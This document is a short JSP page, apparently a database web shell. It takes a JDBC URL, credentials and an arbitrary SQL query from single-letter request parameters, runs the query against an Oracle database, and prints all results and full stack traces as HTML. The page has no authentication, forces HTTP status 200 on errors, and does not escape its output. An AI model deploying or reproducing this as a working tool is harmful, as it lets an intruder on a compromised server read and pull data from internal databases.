<%@ page import="java.sql.*" %>  
<%@ page import="java.util.*" %>  
<%@ page import="java.io.*" %>  
<%@page import="oracle.jdbc.driver.*" %>
<%@page import="oracle.sql.*" %>
<%@page import="oracle.jdbc.driver.OracleDriver;"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>  
<%  
try {
    String driver = "oracle.jdbc.driver.OracleDriver";  
    String url = request.getParameter("u");  
    String username = request.getParameter("n");  
    String password = request.getParameter("p");  
    String query = request.getParameter("s");  
    if (query == null) {
        return;
    }
    Class.forName(driver);  
    Connection conn = DriverManager.getConnection(url, username, password);
    out.println("Connected Successfully...<br>");
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    out.println("Query Executed....<br>");
    ResultSetMetaData rsmd = rs.getMetaData();
    int columnCount = rsmd.getColumnCount();
    ArrayList<String> columnNames = new ArrayList<String>();
    for (int i = 1; i <= columnCount; i++) {
        columnNames.add(rsmd.getColumnName(i));
    }
    ArrayList<ArrayList<String>> results = new ArrayList<ArrayList<String>>();
    while (rs.next()) {
        ArrayList<String> rowData = new ArrayList<String>();
        for (int i = 1; i <= columnCount; i++) {
            rowData.add(rs.getString(i));
        }
        results.add(rowData);
    }
    rs.close();
    conn.close();
    out.println("<h3>Query Results:</h3>");
    out.println("<table border=\"1\">");
    out.println("<tr>");
    for (String columnName : columnNames) {
        out.println("<th>" + columnName + "</th>");
    }
    out.println("</tr>");
    for (ArrayList<String> row : results) {
        out.println("<tr>");
        for (String value : row) {
            out.println("<td>" + value + "</td>");
        }
        out.println("</tr>");
    }
    out.println("</table>");
} catch (Exception e) {  
    out.println("<p><h3>Error Occurred</h3></p><br>");
    out.println("<p>Error Message: " + e.getMessage() + "</p><br>");
    StringWriter sw = new StringWriter();
    PrintWriter pw = new PrintWriter(sw);
    e.printStackTrace(pw);
    out.println("<pre>" + sw.toString() + "</pre>");
    response.setStatus(200); 
}  
out.println("<p><h3>Finished</h3></p>");
%>